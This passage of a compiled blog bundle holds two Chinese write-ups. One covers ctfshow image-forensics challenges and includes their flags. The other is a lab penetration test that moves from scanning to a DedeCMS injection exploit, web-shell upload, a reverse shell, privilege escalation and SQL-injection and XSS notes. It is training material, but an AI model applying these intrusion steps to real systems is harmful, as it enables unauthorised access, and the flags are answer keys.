misc27</h3>\n<blockquote>\n<p>考点时jpg文件格式 这个参考</p>\n</blockquote>\n<blockquote>\n<p><strong><a href="https://blog.csdn.net/weixin_40673765/article/details/118786341" target="_blank" rel="noopener noreferrer">jpg文件格式<ExternalLinkIcon/></a></strong>               <img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291717712.gif" data="aurora"></p>\n</blockquote>\n<blockquote>\n<p>Jpg文件宽高是在4中 所以需要修改宽高时可以直接查找FFC0 6-7位是高 8-9位是宽</p>\n</blockquote>\n<blockquote>\n<p>当什么提示flag在下面上面就修改高 宽看题目意思修改</p>\n</blockquote>\n<blockquote>\n<p><em><strong>Jpg的宽高是先高后宽</strong></em></p>\n</blockquote>\n<blockquote>\n<p>在第四块区域中0008 0008 是高和宽 注意要倒着看</p>\n</blockquote>\n<h3 id="misc28" tabindex="-1"><a class="header-anchor" href="#misc28" aria-hidden="true">#</a> misc28</h3>\n<blockquote>\n<p><a href="https://www.jianshu.com/p/4fabac6b15b3" target="_blank" rel="noopener noreferrer">GIF 字节格式<ExternalLinkIcon/></a></p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291717050.gif" data="aurora"></p>\n<blockquote>\n<p>474946383961 文件头后是宽高</p>\n</blockquote>\n<blockquote>\n<p><strong>注意点</strong> 还有 Image Seperator里的下一帧宽高也需要改</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291717123.gif" data="aurora"></p>\n<blockquote>\n<p>这里插一句 gif动图是一帧一帧图片结合起来的 所以每一帧动图都会有Graphics Control Extension 和 Image Descriptor 9021 F9 04 01 32 00 02 00 2C 00 00 00 00 84 03 96 00 87</p>\n</blockquote>\n<blockquote>\n<p>所以呢 改图片需要将整合图片的宽高和每一帧的宽高都要一起改</p>\n</blockquote>\n<blockquote>\n<p>我直接搜索相同宽高一起改就完事了（跟bmp图片文件一样 宽高是倒的 倒着读就行）</p>\n</blockquote>\n<blockquote>\n<p>这里引入stegsolve 图片查看器</p>\n</blockquote>\n<h3 id="misc29" tabindex="-1"><a class="header-anchor" href="#misc29" aria-hidden="true">#</a> misc29</h3>\n<blockquote>\n<p>也是gif文件格式 根据题目修改高 记得每一帧的高都要修改</p>\n</blockquote>\n<blockquote>\n<p>保存以后发现是一张动图，这里就用到了stegsolve工具 analyse模块中frame browser （动图帧格式预览）一帧一帧查看 就获得了</p>\n</blockquote>\n<h3 id="misc30" tabindex="-1"><a class="header-anchor" href="#misc30" aria-hidden="true">#</a> misc30</h3>\n<blockquote>\n<p>还是bmp图片格式 所以按照题目要求修改 宽度950 （3B6）就行 注意得倒着写</p>\n</blockquote>\n<h3 id="misc31" tabindex="-1"><a class="header-anchor" href="#misc31" aria-hidden="true">#</a> misc31</h3>\n<blockquote>\n<p>Bmp图片格式 按照要求高度是对的 修改宽度 根据字节数手搓宽度 注意字节数得除以3才得到像素，因为三原色 但是求解的宽度不是整数需要向下取整</p>\n</blockquote>\n<h3 id="misc32" tabindex="-1"><a class="header-anchor" href="#misc32" aria-hidden="true">#</a> misc32</h3>\n<blockquote>\n<p>考察了png 的crc检验 把文件放到脚本里去跑得出宽和高</p>\n</blockquote>\n<h3 id="misc33" tabindex="-1"><a class="header-anchor" href="#misc33" aria-hidden="true">#</a> misc33</h3>\n<blockquote>\n<p>和上题一样 跑脚本</p>\n</blockquote>\n<h3 id="misc34" tabindex="-1"><a class="header-anchor" href="#misc34" aria-hidden="true">#</a> misc34</h3>\n<blockquote>\n<p>根据提示用脚本遍历宽度就行</p>\n</blockquote>\n<h3 id="miscc35" tabindex="-1"><a class="header-anchor" href="#miscc35" aria-hidden="true">#</a> miscc35</h3>\n<blockquote>\n<p>不能理解为什么高度也会被改掉</p>\n</blockquote>\n<blockquote>\n<p>那么既然改了为什么高度是600</p>\n</blockquote>\n<blockquote>\n<p>那如果遍历高度和宽度呢</p>\n</blockquote>\n<blockquote>\n<p>发现数据量过于庞大 然后上网搜了下 如何批量检测损坏文件</p>\n</blockquote>\n<blockquote>\n<p>引入imghdr库 但是跑出来的甚至是修改好的 也是被检测出来是损坏的 本来题目给的就是损坏文件</p>\n</blockquote>\n<p>这道题</p>\n<p>这边跑脚本的时候注意 宽高所占的字节数 一个十六进制字母占到0.5个字节 一般这个位置是2-4个字节 如果2个字节的话要用短整型（h） 如果4个字节的话要用整型（i）struct.pack(\'&gt;h\',i)如果像bmp是倒着写的可以[::-1]</p>\n<h3 id="misc36" tabindex="-1"><a class="header-anchor" href="#misc36" aria-hidden="true">#</a> misc36</h3>\n<blockquote>\n<p>和上一道同理，如果出现有图像但是不是所需要的图像可以考虑改大图片的高，或许就有用呢，一般高度改了确实能隐藏，跑的脚本在文件下。</p>\n</blockquote>\n<h3 id="misc37" tabindex="-1"><a class="header-anchor" href="#misc37" aria-hidden="true">#</a> misc37</h3>\n<blockquote>\n<p>打开文件是发现是动图，提示也是flag在图片里所以gif一张一张分离，用stegsolve analyse frame browser ctfshow{2056782cd57b13261dcbbe3d6eecda17}</p>\n</blockquote>\n<h3 id="misc38" tabindex="-1"><a class="header-anchor" href="#misc38" aria-hidden="true">#</a> misc38</h3>\n<blockquote>\n<p>提示是还是flag在图片里，打开后发现是个png文件，看了wp以后才知道这个提示是要先png转到gif格式  工具<a href="https://cdkm.com/cn/png-to-gif" target="_blank" rel="noopener noreferrer">png转gif工具<ExternalLinkIcon/></a> 然后和上一题同样操作就行了</p>\n</blockquote>\n<p>ctfshow{48b722b570c603ef58cc0b83bbf7680d}</p>\n<blockquote>\n<p>使用apngdis.exe（APNG Disassembler）工具分离文件也可</p>\n</blockquote>\n<h3 id="misc39" tabindex="-1"><a class="header-anchor" href="#misc39" aria-hidden="true">#</a> misc39</h3>\n<blockquote>\n<p>提示是flag如流水，图片帧间隔时间隐写，identify -format &quot;%T &quot; misc39.gif &gt; 1.txt</p>\n</blockquote>\n<blockquote>\n<p>这个实在看不懂了网上找吧</p>\n</blockquote>\n<blockquote>\n<p>flag一般是32位的加上格式是41位，</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291717268.gif" data="aurora"></p>\n<blockquote>\n<p>可以看到3637循环，可以想到01二进制循环，第一位是37 所以37为1，36为0</p>\n</blockquote>\n<blockquote>\n<p>转化为287，287 /41=7 所以7位为一组，转化字符串类型 然后flag就是转化后的字符串</p>\n</blockquote>\n',date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:"/misc/misc2.html",pathLocale:"/",permalink:null,routeMeta:{},slug:"misc2",filePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/misc/misc2.md",filePathRelative:"misc/misc2.md",componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/misc/misc2.html.vue",componentFilePathRelative:"pages/misc/misc2.html.vue",componentFileChunkName:"v-7db590bd",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/misc/misc2.html.js",dataFilePathRelative:"pages/misc/misc2.html.js",dataFileChunkName:"v-7db590bd",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/misc/misc2.html",htmlFilePathRelative:"misc/misc2.html"},{data:{key:"v-1c1db1bc",path:"/penetration/4.html",title:"暗月项目四（完整渗透测试）",lang:"zh-CN",frontmatter:{date:"2023/7/1 19:57",stick:!1,keyword:"misc,ctfshow",description:"渗透测试",title:"暗月项目四（完整渗透测试）",tag:["渗透测试"],categories:["渗透测试","提权","网站"]},excerpt:"",headers:[{level:3,title:"项目四（完整渗透测试）",slug:"项目四-完整渗透测试",children:[]},{level:2,title:"主机扫描",slug:"主机扫描",children:[{level:3,title:"(1)nmap-sn",slug:"_1-nmap-sn",children:[]},{level:3,title:"(2)netdiscover -i",slug:"_2-netdiscover-i",children:[]}]},{level:2,title:"端口扫描",slug:"端口扫描",children:[]},{level:2,title:"改dns服务器地址",slug:"改dns服务器地址",children:[]},{level:2,title:"wfuzz爆破子域名",slug:"wfuzz爆破子域名",children:[]},{level:2,title:"第一个网站的渗透（new.）",slug:"第一个网站的渗透-new",children:[]},{level:2,title:"第二个域名渗透（ww2）",slug:"第二个域名渗透-ww2",children:[{level:3,title:"gobuster 目录扫描",slug:"gobuster-目录扫描",children:[]},{level:3,title:"sql注入漏洞",slug:"sql注入漏洞",children:[]}]}],git:{}},key:"v-1c1db1bc",path:"/penetration/4.html",title:"暗月项目四（完整渗透测试）",lang:"zh-CN",frontmatter:{date:"2023/7/1 19:57",stick:!1,keyword:"misc,ctfshow",description:"渗透测试",title:"暗月项目四（完整渗透测试）",tag:["渗透测试"],categories:["渗透测试","提权","网站"]},excerpt:"",headers:[{level:3,title:"项目四（完整渗透测试）",slug:"项目四-完整渗透测试",children:[]},{level:2,title:"主机扫描",slug:"主机扫描",children:[{level:3,title:"(1)nmap-sn",slug:"_1-nmap-sn",children:[]},{level:3,title:"(2)netdiscover -i",slug:"_2-netdiscover-i",children:[]}]},{level:2,title:"端口扫描",slug:"端口扫描",children:[]},{level:2,title:"改dns服务器地址",slug:"改dns服务器地址",children:[]},{level:2,title:"wfuzz爆破子域名",slug:"wfuzz爆破子域名",children:[]},{level:2,title:"第一个网站的渗透（new.）",slug:"第一个网站的渗透-new",children:[]},{level:2,title:"第二个域名渗透（ww2）",slug:"第二个域名渗透-ww2",children:[{level:3,title:"gobuster 目录扫描",slug:"gobuster-目录扫描",children:[]},{level:3,title:"sql注入漏洞",slug:"sql注入漏洞",children:[]}]}],content:'\r\n### 项目四（完整渗透测试）\r\n\r\n## 主机扫描\r\n\r\n### (1)nmap-sn\r\n\r\n![image-20230611205450303](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306112054777.png)\r\n\r\n### (2)netdiscover -i\r\n\r\n![image-20230611205651833](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306112056939.png)\r\n\r\n## 端口扫描\r\n\r\n首先用masscan扫描\r\n\r\n![image-20230611210309546](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306112103816.png)\r\n\r\n然后再用nmap进行端口探测\r\n\r\n![image-20230612150949554](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306121509909.png)\r\n\r\n通过对端口的解析，可以看每个端口对应的服务\r\n\r\n## 改dns服务器地址\r\n\r\n发现是由dns53 端口开启的，靶机应该是有dns服务的，所以要先把dns服务器改成靶机地址\r\n\r\n（1）Windows\r\n\r\n![image-20230612154425537](C:/Users/23167/AppData/Roaming/Typora/typora-user-images/image-20230612154425537.png)\r\n\r\n（2）kali\r\n\r\n /etc/resolv.conf\r\n\r\n![image-20230612160048638](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306121600839.png)\r\n\r\n## wfuzz爆破子域名\r\n\r\nwfuzz学习地址[wfuzz学习_wfuzz参数_](https://blog.csdn.net/qq_45869039/article/details/108874749)\r\n\r\n/usr/share/amass/wordlists/subdomains-top1mil-110000.txt kali自带的子域名爆破字典\r\n\r\n![image-20230612160330695](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306121603759.png)\r\n\r\nnew www ww2 WWW \r\n\r\n## 第一个网站的渗透（new.）\r\n\r\n![image-20230625095057736](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306250951130.png)\r\n\r\n是一个dedecms类型网站 \r\n\r\n一般dedecms是有固定的目录结构的，那么根据目录结构能访问到其他页面\r\n\r\n如果像我这种小白不了解dedecms的话，可以先扫描一遍该网站的目录结构\r\n\r\n用[dirbuster]([(54条消息) Web渗透之信息收集——目录扫描从御剑到Dirbuster_Mr. Wanderer的博客-CSDN博客](https://blog.csdn.net/Mr_Wanderer/article/details/107410457))先扫描一边网站目录 用御剑效果差不多，看在本机还是kali里完成实验了\r\n\r\n![image-20230625100119420](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306251001538.png)\r\n\r\n查看dedecms版本号，网上找对应的exp，\r\n\r\n版本号的相对路径：/data/admin/ver.txt\r\n\r\n![image-20230625100820990](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306251008176.png)\r\n\r\n20150618是存在漏洞的 [Dedecms 20150618 注入漏洞](http://www.hekaiyu.cn/hacker/3060.html)\r\n\r\n根据文章实现exp\r\n\r\nmember模块开启，可以注册登录\r\n\r\n![image-20230625101514441](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306251015609.png)\r\n\r\n先注册一个账号\r\n\r\n增加一个分类![image-20230625171115401](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306251711750.png)\r\n\r\n利用给的exp能跑出admin账号的密码md5值\r\n\r\n该exp需要获取一个登录账号的cookie（requests包中） 需要在python2环境下运行\r\n\r\n![image-20230625171131658](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306251711785.png)\r\n\r\n获得admin账号密码进行登录\r\n\r\n![image-20230625171627055](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306251716192.png)\r\n\r\n获取权限后上传小马\r\n\r\n![image-20230706171558794](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307061716006.png)\r\n\r\n拿蚁剑连后上传大马（ASPXSpy2014.aspx admin）查看是否可执行cmd文件，然后开始提权\r\n\r\n![image-20230724110742886](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241107956.png)\r\n\r\n生成攻击载荷\r\n\r\n![image-20230724104346468](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241043543.png)\r\n\r\n查看服务器可写目录，然后上传攻击载荷\r\n\r\n![image-20230724104545057](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241045107.png)\r\n\r\n反弹shell\r\n\r\n![image-20230724111207836](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241112877.png)\r\n\r\n有关msfconsole的使用可以重开一篇\r\n\r\n![image-20230724145454737](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241454779.png)\r\n\r\n监听后连上\r\n\r\n然后提权 首先用use post/multi/recon/local_exploit_suggester跑一边可以利用的exp\r\n\r\n![image-20230725220840944](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307252208247.png)\r\n\r\n跑完以后就看模块利用 不会使用模块可以百度一下\r\n\r\n![image-20230725221029006](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307252210072.png)\r\n\r\n提成功了获得系统权限\r\n\r\n然后找flag 可以先在meterpreter下先 `search -f *flag*`\r\n\r\n![image-20230726103234108](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307261032479.png)\r\n\r\n然后再进入shell 查看内容（玄学卡实在不行重新弹一个shell回来）\r\n\r\n![image-20230726103315356](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307261033400.png)\r\n\r\n \r\n\r\n## 第二个域名渗透（ww2）\r\n\r\n### gobuster 目录扫描\r\n\r\n感觉和dirbuster效果差也差不多， 具体操作 相对可以\r\n\r\n![image-20230731100905532](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307311009701.png)\r\n\r\n比dirbuster功能相对多一点，能扫dns，fuzz，tftp？ 我感觉需要一个相对清楚的目录结构，dirbuster可能会更适合一点，如果是查看该网站有什么特定类型文件，那就gobuster，当然功能性上也是gobuster nice\r\n\r\ngobuster dir -u http://ww2.cc123.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "aspx,html" -o ww2dir\r\n\r\n![image-20230731101327317](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307311013387.png)\r\n\r\n扫完简单看一下有哪些aspx和html，html占据较大部分，有一些aspx可以实现动态交互，然后找漏洞\r\n\r\n### sql注入漏洞\r\n\r\n老的静态网站， sql语言   select\t * from ### username=‘  ’ and password = ‘#####’\r\n\r\n存在注入select\t * from ### username=‘ xxxx - - ’ and password = ‘#####’\r\n\r\n注释掉后面的代码，从而绕过\r\n\r\n![image-20230731153300162](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307311533391.png)\r\n\r\nmessage.aspx存在xss漏洞\r\n\r\n![image-20230731154125653](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307311541727.png)\r\n\r\n这个留言留到admin管理系统中\r\n\r\n![image-20230731154322534](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307311543608.png)\r\n\r\n\r\n\r\n附一条xss常见攻击脚本[XSS攻击常识及常见的XSS攻击脚本汇总](https://www.jianshu.com/p/36b3578a6629)     和笼统危害[XSS漏洞及利用](https://zhuanlan.zhihu.com/p/353097872)\r\n\r\n本地是搭建了xsstool利用工具的  admin 1234567\r\n\r\n![image-20230731173313399](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307311733681.png)\r\n',contentRendered:'<h3 id="项目四-完整渗透测试" tabindex="-1"><a class="header-anchor" href="#项目四-完整渗透测试" aria-hidden="true">#</a> 项目四（完整渗透测试）</h3>\n<h2 id="主机扫描" tabindex="-1"><a class="header-anchor" href="#主机扫描" aria-hidden="true">#</a> 主机扫描</h2>\n<h3 id="_1-nmap-sn" tabindex="-1"><a class="header-anchor" href="#_1-nmap-sn" aria-hidden="true">#</a> (1)nmap-sn</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230611205450303" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306112054777.png" data="aurora"></p>\n<h3 id="_2-netdiscover-i" tabindex="-1"><a class="header-anchor" href="#_2-netdiscover-i" aria-hidden="true">#</a> (2)netdiscover -i</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230611205651833" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306112056939.png" data="aurora"></p>\n<h2 id="端口扫描" tabindex="-1"><a class="header-anchor" href="#端口扫描" aria-hidden="true">#</a> 端口扫描</h2>\n<p>首先用masscan扫描</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230611210309546" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306112103816.png" data="aurora"></p>\n<p>然后再用nmap进行端口探测</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230612150949554" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306121509909.png" data="aurora"></p>\n<p>通过对端口的解析，可以看每个端口对应的服务</p>\n<h2 id="改dns服务器地址" tabindex="-1"><a class="header-anchor" href="#改dns服务器地址" aria-hidden="true">#</a> 改dns服务器地址</h2>\n<p>发现是由dns53 端口开启的，靶机应该是有dns服务的，所以要先把dns服务器改成靶机地址</p>\n<p>（1）Windows</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230612154425537" originSrc="C:/Users/23167/AppData/Roaming/Typora/typora-user-images/image-20230612154425537.png" data="aurora"></p>\n<p>（2）kali</p>\n<p>/etc/resolv.conf</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230612160048638" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306121600839.png" data="aurora"></p>\n<h2 id="wfuzz爆破子域名" tabindex="-1"><a class="header-anchor" href="#wfuzz爆破子域名" aria-hidden="true">#</a> wfuzz爆破子域名</h2>\n<p>wfuzz学习地址<a href="https://blog.csdn.net/qq_45869039/article/details/108874749" target="_blank" rel="noopener noreferrer">wfuzz学习_wfuzz参数_<ExternalLinkIcon/></a></p>\n<p>/usr/share/amass/wordlists/subdomains-top1mil-110000.txt kali自带的子域名爆破字典</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230612160330695" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306121603759.png" data="aurora"></p>\n<p>new www ww2 WWW</p>\n<h2 id="第一个网站的渗透-new" tabindex="-1"><a class="header-anchor" href="#第一个网站的渗透-new" aria-hidden="true">#</a> 第一个网站的渗透（new.）</h2>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230625095057736" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306250951130.png" data="aurora"></p>\n<p>是一个dedecms类型网站</p>\n<p>一般dedecms是有固定的目录结构的，那么根据目录结构能访问到其他页面</p>\n<p>如果像我这种小白不了解dedecms的话，可以先扫描一遍该网站的目录结构</p>\n<p>用[dirbuster](<a href="https://blog.csdn.net/Mr_Wanderer/article/details/107410457" target="_blank" rel="noopener noreferrer">(54条消息) Web渗透之信息收集——目录扫描从御剑到Dirbuster_Mr. Wanderer的博客-CSDN博客<ExternalLinkIcon/></a>)先扫描一边网站目录 用御剑效果差不多，看在本机还是kali里完成实验了</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230625100119420" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306251001538.png" data="aurora"></p>\n<p>查看dedecms版本号，网上找对应的exp，</p>\n<p>版本号的相对路径：/data/admin/ver.txt</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230625100820990" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306251008176.png" data="aurora"></p>\n<p>20150618是存在漏洞的 <a href="http://www.hekaiyu.cn/hacker/3060.html" target="_blank" rel="noopener noreferrer">Dedecms 20150618 注入漏洞<ExternalLinkIcon/></a></p>\n<p>根据文章实现exp</p>\n<p>member模块开启，可以注册登录</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230625101514441" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306251015609.png" data="aurora"></p>\n<p>先注册一个账号</p>\n<p>增加一个分类<img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230625171115401" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306251711750.png" data="aurora"></p>\n<p>利用给的exp能跑出admin账号的密码md5值</p>\n<p>该exp需要获取一个登录账号的cookie（requests包中） 需要在python2环境下运行</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230625171131658" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306251711785.png" data="aurora"></p>\n<p>获得admin账号密码进行登录</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230625171627055" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306251716192.png" data="aurora"></p>\n<p>获取权限后上传小马</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230706171558794" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307061716006.png" data="aurora"></p>\n<p>拿蚁剑连后上传大马（ASPXSpy2014.aspx admin）查看是否可执行cmd文件，然后开始提权</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230724110742886" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241107956.png" data="aurora"></p>\n<p>生成攻击载荷</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230724104346468" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241043543.png" data="aurora"></p>\n<p>查看服务器可写目录，然后上传攻击载荷</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230724104545057" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241045107.png" data="aurora"></p>\n<p>反弹shell</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230724111207836" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241112877.png" data="aurora"></p>\n<p>有关msfconsole的使用可以重开一篇</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230724145454737" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241454779.png" data="aurora"></p>\n<p>监听后连上</p>\n<p>然后提权 首先用use post/multi/recon/local_exploit_suggester跑一边可以利用的exp</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230725220840944" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307252208247.png" data="aurora"></p>\n<p>跑完以后就看模块利用 不会使用模块可以百度一下</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230725221029006" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307252210072.png" data="aurora"></p>\n<p>提成功了获得系统权限</p>\n<p>然后找flag 可以先在meterpreter下先 <code>search -f *flag*</code></p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230726103234108" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307261032479.png" data="aurora"></p>\n<p>然后再进入shell 查看内容（玄学卡实在不行重新弹一个shell回来）</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230726103315356" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307261033400.png" data="aurora"></p>\n<h2 id="第二个域名渗透-ww2" tabindex="-1"><a class="header-anchor" href="#第二个域名渗透-ww2" aria-hidden="true">#</a> 第二个域名渗透（ww2）</h2>\n<h3 id="gobuster-目录扫描" tabindex="-1"><a class="header-anchor" href="#gobuster-目录扫描" aria-hidden="true">#</a> gobuster 目录扫描</h3>\n<p>感觉和dirbuster效果差也差不多， 具体操作 相对可以</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230731100905532" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307311009701.png" data="aurora"></p>\n<p>比dirbuster功能相对多一点，能扫dns，fuzz，tftp？ 我感觉需要一个相对清楚的目录结构，dirbuster可能会更适合一点，如果是查看该网站有什么特定类型文件，那就gobuster，当然功能性上也是gobuster nice</p>\n<p>gobuster dir -u http://ww2.cc123.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x &quot;aspx,html&quot; -o ww2dir</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230731101327317" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307311013387.png" data="aurora"></p>\n<p>扫完简单看一下有哪些aspx和html，html占据较大部分，有一些aspx可以实现动态交互，然后找漏洞</p>\n<h3 id="sql注入漏洞" tabindex="-1"><a class="header-anchor" href="#sql注入漏洞" aria-hidden="true">#</a> sql注入漏洞</h3>\n<p>老的静态网站， sql语言   select\t * from ### username=‘  ’ and password = ‘#####’</p>\n<p>存在注入select\t * from ### username=‘ xxxx - - ’ and password = ‘#####’</p>\n<p>注释掉后面的代码，从而绕过</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230731153300162" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307311533391.png" data="aurora"></p>\n<p>message.aspx存在xss漏洞</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230731154125653" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307311541727.png" data="aurora"></p>\n<p>这个留言留到admin管理系统中</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230731154322534" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307311543608.png" data="aurora"></p>\n<p>附一条xss常见攻击脚本<a href="https://www.jianshu.com/p/36b3578a6629" target="_blank" rel="noopener noreferrer">XSS攻击常识及常见的XSS攻击脚本汇总<ExternalLinkIcon/></a>     和笼统危害<a href="https://zhuanlan.zhihu.com/p/353097872" target="_blank" rel="noopener noreferrer">XSS漏洞及利用<ExternalLinkIcon/></a></p>\n<p>本地是搭建了xsstool利用工具的  admin 1234567</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230731173313399" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307311733681.png" data="aurora"></p>\n',date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:"/penetration/4.html",pathLocale:"/",permalink:null,routeMeta:{},slug:"4",filePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/penetration/4.md",filePathRelative:"penetration/4.md",componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/penetration/4.html.vue",componentFilePathRelative:"pages/penetration/4.html.vue",componentFileChunkName:"v-1c1db1bc",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/penetration/4.html.js",dataFilePathRelative:"pages/penetration/4.html.js",dataFileChunkName:"v-1c1db1bc",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/penetration/4.html",htmlFilePathRelative:"penetration/4.html"},{data:{key:"v-02eb67bd",path:"/penetration/",title:"渗透测试提权",lang:"zh-CN",frontmatter:{date:"2023/5/31 